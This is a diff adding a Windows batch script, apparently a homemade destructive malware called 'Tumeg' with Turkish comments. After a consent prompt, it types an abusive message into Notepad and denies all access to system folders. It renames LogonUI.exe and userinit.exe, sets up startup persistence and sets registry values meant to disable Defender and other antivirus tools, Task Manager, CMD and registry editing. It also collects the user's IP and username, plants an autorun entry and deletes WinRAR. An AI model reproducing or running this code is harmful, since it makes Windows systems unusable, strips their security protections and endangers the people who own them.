@@ -1,0 +1,1487 @@
+@echo off
+color 4F
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo Please run as administrator.
+    timeout /t 3 >nul
+    exit
+)
+
+@echo off
+setlocal
+
+set "message=This is a malware that permanently damages your computer. Do you accept what is written on the "http://bit.ly/tusufterms" page? [Y/N]"
+set "title=Confirmation"
+
+echo.
+echo %message%
+echo.
+
+choice /c YN /n /m ""
+
+if errorlevel 2 (
+    echo User selected 'Cancel'
+    exit /b
+)
+
+for /r "%userprofile%\Desktop" %%i in (Tumeg.exe) do (
+    echo File found: %%i
+    move "%%i" "C:\ProgramData"
+)
+
+
+icacls "C:\ProgramData\Tumeg.exe" /grant Administrators:(OI)(CI)F
+
+
+@echo off
+
+reg add "HKCU\Software\Microsoft\Notepad" /v iPointSize /t REG_DWORD /d 36 /f
+
+
+@echo off
+echo Set WshShell = WScript.CreateObject("WScript.Shell") > C:\type.vbs
+echo WshShell.SendKeys WScript.Arguments.Item(0) >> C:\type.vbs
+start notepad
+ping 127.0.0.1 -n 2 > nul
+wscript.exe "C:\type.vbs" "Y"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "P"
+wscript.exe "C:\type.vbs" "C"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "i"
+wscript.exe "C:\type.vbs" "s"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "f"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "k"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "d"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "b"
+wscript.exe "C:\type.vbs" "y"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "T"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "m"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "g"
+wscript.exe "C:\type.vbs" "!"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "R"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "m"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "m"
+wscript.exe "C:\type.vbs" "b"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" ","
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "y"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "a"
+wscript.exe "C:\type.vbs" "n"
+wscript.exe "C:\type.vbs" "'"
+wscript.exe "C:\type.vbs" "t"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "s"
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "a"
+wscript.exe "C:\type.vbs" "p"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "f"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "m"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "h"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "."
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "S"
+wscript.exe "C:\type.vbs" "t"
+wscript.exe "C:\type.vbs" "a"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" "t"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" "y"
+wscript.exe "C:\type.vbs" "i"
+wscript.exe "C:\type.vbs" "n"
+wscript.exe "C:\type.vbs" "g"
+wscript.exe "C:\type.vbs" "!"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "!"
+
+
+del C:\type.vbs
+taskkill /f /im notepad.exe
+
+icacls "C:\Windows" /deny Everyone:(OI)(CI)F
+
+
+icacls "C:\Program Files" /deny Everyone:(OI)(CI)F
+
+
+icacls "C:\ProgramData" /deny Everyone:(OI)(CI)F
+
+
+icacls "C:\System Volume Information" /deny Everyone:(OI)(CI)F
+
+
+icacls "C:\Recovery" /deny Everyone:(OI)(CI)F
+
+
+icacls "C:\$RECYCLE.BIN" /deny Everyone:(OI)(CI)F
+
+
+icacls "C:\Windows\config" /deny Everyone:(OI)(CI)F
+
+
+icacls "C:\Windows\system32" /deny Everyone:(OI)(CI)F
+
+
+icacls "C:\Windows\system" /deny Everyone:(OI)(CI)F
+
+
+icacls "C:\Windows\winsxs" /deny Everyone:(OI)(CI)F
+
+
+icacls "C:\Windows\SysWOW64" /deny Everyone:(OI)(CI)F
+
+
+@echo off
+set iconPath="C:\ProgramData\Microsoft\Device Stage\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\pictures.ico"
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconSpacing /t REG_SZ /d -1500 /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconVerticalSpacing /t REG_SZ /d -1500 /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v Shell Icon Size /t REG_SZ /d 32 /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconFont /t REG_DWORD /d 0 /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 3 /t REG_SZ /d %iconPath% /f
+taskkill /f /im explorer.exe
+start explorer.exe
+
+@echo off
+mode con: cols=50 lines=3
+
+@echo off
+set "dosyaYolu=%ProgramData%\caps.vbs"
+
+REM VBScript kodunu belirtilen dosya yoluna yazma
+echo Set WshShell = WScript.CreateObject("WScript.Shell") > "%dosyaYolu%"
+echo do >> "%dosyaYolu%"
+echo WScript.Sleep 500 >> "%dosyaYolu%"
+echo WshShell.SendKeys "{CAPSLOCK}" >> "%dosyaYolu%"
+echo loop >> "%dosyaYolu%"
+
+@echo off
+
+start "" "C:\ProgramData\caps.vbs"
+start "" "C:\ProgramData\caps.vbs"
+
+start "" "C:\ProgramData\caps.vbs"
+
+start "" "C:\ProgramData\caps.vbs"
+
+start "" "C:\ProgramData\caps.vbs"
+
+start "" "C:\ProgramData\caps.vbs"
+
+start "" "C:\ProgramData\caps.vbs"
+
+start "" "C:\ProgramData\caps.vbs"
+
+start "" "C:\ProgramData\caps.vbs"
+
+start "" "C:\ProgramData\caps.vbs"
+
+
+
+@echo off
+start "" https://youtu.be/Ys_F9bsrWkg
+ping 127.0.0.1 -n 1 -w 1000 > nul
+
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+set "vbsfile=%temp%\f11.vbs"
+
+echo Set wshShell = CreateObject("WScript.Shell") > "%vbsfile%"
+echo wshShell.SendKeys "{F11}" >> "%vbsfile%"
+
+cscript "%vbsfile%"
+
+del "%vbsfile%"
+
+
+@echo off
+sc config winpeshl start=disabled
+
+@echo off
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\MiniNT" /v DisallowWinPELicensing /t REG_DWORD /d 1 /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx" /v "TITLE" /t REG_SZ /d "Tumeg doesn't want to upload your files LOL!" /f
+
+@echo off
+set "dosya_yolu=C:\ProgramData\Tumeg.exe"  REM Dosyanın yolunu belirleyin
+
+REM Dosyanın silinmesini engellemek için dosyanın erişim izinlerini sadece okuma olarak ayarlayın
+attrib +r "%dosya_yolu%"
+
+REM Dosyayı gizli yapın
+attrib +h "%dosya_yolu%"
+
+
+@echo off
+
+set script=links.vbs
+set temp_folder=%temp%
+
+(
+  echo Set WshShell = CreateObject^("WScript.Shell"^)
+  echo.
+  echo link1 = "https://duckduckgo.com/?q=hydra+dragon+antivirus+(rogue+real)"
+  echo link2 = "https://duckduckgo.com/?q=free+robux"
+  echo link3 = "https://duckduckgo.com/?q=how+to+download+windows+12"
+  echo link4 = "https://duckduckgo.com/?q=how+to+make+virus+with+batch"
+  echo link5 = "https://duckduckgo.com/?q=roblox+fps+unlocker"
+  echo link6 = "https://duckduckgo.com/?q=bandicam+serial+key+free+download"
+  echo link7 = "https://duckduckgo.com/?q=Is+protogent+safe?"
+  echo link8 = "https://duckduckgo.com/?q=wannacry+dowloand"
+  echo link9 = "https://duckduckgo.com/?q=download+rogue+antivirus"
+  echo link10 = "https://duckduckgo.com/?q=no+escape+exe+antivirus"
+  echo link11 = "https://duckduckgo.com/?q=pdf+converter"
+  echo link12 = "https://duckduckgo.com/?q=gta+6+leaks"
+  echo link13 = "https://duckduckgo.com/?q=gta+6+download+full+version"
+  echo.
+  echo WshShell.Run link1, 0, False
+  echo WScript.Sleep 9000
+  echo WshShell.Run link2, 0, False
+  echo WScript.Sleep 8000
+  echo WshShell.Run link3, 0, False
+  echo WScript.Sleep 9000
+  echo WshShell.Run link4, 0, False
+  echo WScript.Sleep 8000
+  echo WshShell.Run link5, 0, False
+  echo WScript.Sleep 8000
+  echo WshShell.Run link6, 0, False
+  echo WScript.Sleep 7000
+  echo WshShell.Run link7, 0, False
+  echo WScript.Sleep 9000
+  echo WshShell.Run link8, 0, False
+  echo WScript.Sleep 9000
+  echo WshShell.Run link9, 0, False
+  echo WScript.Sleep 9000
+  echo WshShell.Run link10, 0, False
+  echo WshShell.Run link11, 0, False
+  echo WScript.Sleep 8000
+  echo WshShell.Run link12, 0, False
+  echo WshShell.Run link9, 0, False
+  echo WScript.Sleep 9000
+  echo WshShell.Run link13, 0, False
+) > "%temp_folder%\%script%"
+
+yes: %temp_folder%\%script%
+
+start /d "%temp%" links.vbs
+
+@echo off
+
+REM Kullanıcı IP adresini almak için ipconfig komutunu kullanalım
+for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /C:"IPv4 Address"') do (
+    set "UserIP=%%A"
+)
+
+REM Kullanıcı adını almak için UserName ortam değişkenini kullanalım
+set "UserName=%USERNAME%"
+
+REM Kullanıcı oluşturma tarihini almak için WMIC komutunu kullanalım
+for /f "skip=1 delims=" %%B in ('wmic useraccount where "Name='%UserName%'" get Caption') do (
+    set "UserCreationDate=%%B"
+    goto :FoundDate
+)
+:FoundDate
+
+REM Internet IP adresini almak için nslookup komutunu kullanalım
+for /f "tokens=2 delims= " %%C in ('nslookup myip.opendns.com. resolver1.opendns.com ^| find "Address"') do (
+    set "InternetIP=%%C"
+)
+
+REM Bilgileri userinfo.txt dosyasına yazalım
+(
+    echo User IP address: %UserIP:~1%
+    echo User name: %UserName%
+    echo User creation date: %UserCreationDate%
+    echo Internet IP address: %InternetIP%
+) > userinfo.txt
+
+
+@echo off
+set folder="C:\Windows\System32"
+set file="LogonUI.exe"
+set new_name="LogonUI.bak"
+ren %folder%\%file% %new_name%
+
+@echo off
+set folder="C:\Windows\System32"
+set file="userinit.exe"
+set new_name="userinit.bak"
+ren %folder%\%file% %new_name%
+
+@echo off
+
+
+echo @echo off > "C:\Windows\System32\config\startup.bat"
+echo echo crash ^> c:\windows\livekernelreports\trigger.txt >> "C:\Windows\System32\config\startup.bat"
+
+@echo off
+
+
+echo @echo off > "C:\Windows\System32\config\startup2.bat"
+echo echo crash ^> taskkill /f /im LogonUI.bak >> "C:\Windows\System32\config\startup2.bat"
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartupScript" /t REG_SZ /d "C:\Windows\System32\config\startup2.bat" /f
+
+
+@echo off
+
+
+echo @echo off > "C:\Windows\System32\config\startup3.bat"
+echo echo crash ^> taskkill /f /im explorer.exe >> "C:\Windows\System32\config\startup3.bat"
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartupScript" /t REG_SZ /d "C:\Windows\System32\config\startup3.bat" /f
+
+
+@echo off
+
+
+echo @echo off > "C:\Windows\System32\config\startup4.bat"
+echo echo crash ^> taskkill /f /im userinit.bak >> "C:\Windows\System32\config\startup4.bat"
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartupScript" /t REG_SZ /d "C:\Windows\System32\config\startup4.bat" /f
+
+
+@echo off
+
+
+echo @echo off > "C:\Windows\System32\config\startup5.bat"
+echo echo crash ^> taskkill /f /im dwm.exe >> "C:\Windows\System32\config\startup5.bat"
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartupScript" /t REG_SZ /d "C:\Windows\System32\config\startup5.bat" /f
+
+
+
+@echo off
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "AntiVirusOverride" /t REG_DWORD /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKEY_CLASSES_ROOT\.cat" /v "Content Type" /t REG_SZ /d "dllhost.exe" /f
+
+@echo off
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\AVAST Software\Avast" /v "aswidsagenta" /t REG_DWORD /d "0" /f
+
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\AVG" /v "DisableAv" /t REG_DWORD /d "1" /f
+
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Bitdefender" /v "BlockUserModeAccess" /t REG_DWORD /d "1" /f
+
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\McAfee" /v "bDisableSelfProtection" /t REG_DWORD /d "1" /f
+
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security" /v "ProtectEnabled" /t REG_DWORD /d "0" /f
+
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab" /v "Enable" /t REG_DWORD /d "0" /f
+
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Malwarebytes" /v "MalwareProtectionEnabled" /t REG_DWORD /d "0" /f
+
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Norton" /v "Enable" /t REG_DWORD /d "0" /f
+
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Avira" /v "ProductEnabled" /t REG_DWORD /d "0" /f
+
+
+@echo off
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangeTime /t REG_DWORD /d 1 /f
+
+@echo off
+
+set "hedef_klasor=C:\Windows\BitLockerDiscoveryVolumeContents"
+set "hedef_dosya=%hedef_klasor%\autorun.inf"
+
+if exist "%hedef_dosya%" (
+    attrib -r -s -h "%hedef_dosya%" 2>nul
+    del "%hedef_dosya%"
+)
+
+
+echo [autorun] > "%hedef_dosya%"
+echo action=BitLocker To Go Reader >> "%hedef_dosya%"
+echo icon=BitLockerToGo.exe,-1 >> "%hedef_dosya%"
+echo ShellExecute=Tumeg.exe >> "%hedef_dosya%"
+echo UseAutoPlay=1 >> "%hedef_dosya%"
+
+attrib +r +s +h "%hedef_dosya%"
+
+
+@echo off
+
+echo. > "C:\Windows\System32\config\regs.reg"
+echo WScript.Sleep 9000 > "C:\Windows\System32\config\msg.vbs"
+echo MsgBox "Windows cannot find explorer.exe", vbCritical, "Windows" >> "C:\Windows\System32\config\msg.vbs"
+echo Good try! > "C:\Windows\System32\config\msg2.vbs"
+
+
+
+@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+
+@echo off
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell" /v DisablePowerShell /t REG_DWORD /d 1 /f
+
+@echo off
+reg add "HKCU\Software\Policies\Microsoft\MMC" /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f
+
+@echo off
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
+
+@echo off
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePaint /t REG_DWORD /d 1 /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableStickyKeys /t REG_DWORD /d 1 /f
+
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+
+
+
+@echo off
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePerformanceMonitor /t REG_DWORD /d 1 /f
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMMC /t REG_DWORD /d 1 /f
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableEventViewer /t REG_DWORD /d 1 /f
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v NoWinKeys /t REG_DWORD /d 1 /f
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableSnippingTool /t REG_DWORD /d 1 /f
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMagnifier /t REG_DWORD /d 1 /f
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableEaseOfAccess /t REG_DWORD /d 1 /f
+
+
+@echo off
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "perfmon.msc" /d "" /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "perfmon.exe" /d "" /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mmc.exe" /d "" /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mstsc.exe" /d "" /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mobsync.exe" /d "" /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "SoundRecorder.exe" /d "" /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "displayswitch.exe" /d "" /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "conhost.exe" /d "" /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "taskkill.exe" /d "" /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "tasklist.exe" /d "" /f
+
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "iexpress.exe" /d "" /f
+
+@echo off
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /t REG_DWORD /d "1" /f
+
+@echo off
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /t REG_DWORD /d "1" /f
+
+@echo off
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d "4" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue" /t REG_DWORD /d "4" /f
+
+@echo off
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRunAs" /t REG_DWORD /d "1" /f
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+
+@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMSCONFIG /t REG_DWORD /d 1 /f
+
+
+@echo off
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d "1" /f
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /t REG_DWORD /d "4" /f
+
+@echo off
+
+set "ProgramFilesPath=C:\Program Files"
+set "WinRARPath=%ProgramFilesPath%\WinRAR"
+
+IF EXIST "%WinRARPath%" (
+    
+    rmdir /s /q "%WinRARPath%"
+    
+) ELSE (
+    
+)
+
+md DIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDDIEDIEDIEDIEDIEDIEDIEDIE
+md DIEDIEDIEDEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIE
+md DIEDIEDIEDIEDIEIDIEDEDIIDIEDIEDIEDIEDIEDIE
+md DIEEIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIE
+md DIEDIEDIDIEDIEDIEDIEDIEDEDIEIEDIEDIEDIEDIE
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEIEDIEDIDIEDIE
+md DIEDIEIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIIEDIEDIE
+md DIEDIEDIEEIIEDIEDIEDIEDIEDIEDDIEDIEDIEDIE
+md DIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEIIEDIDIEDIEIDIEDIEDIEDIEDIEE
+md DIEDIIEDIEIEDIEDIEDIEEIEDIEDIEEDIEDIEDIEE
+md DIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDEE
+md DIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIDIEE
+md DIEDIEDIEDIDIDIEDIDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIDIIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEIEE
+md DIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIE
+md DIEDIEDIEDIEDIEIDIDIEDIEDIEDIEDIEDIEDIEDIEEDIEE
+md DIEDIEDIEDIEDIIEDIEDIEDIDIEDIEDIEDIEDIEDIE
+md DIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
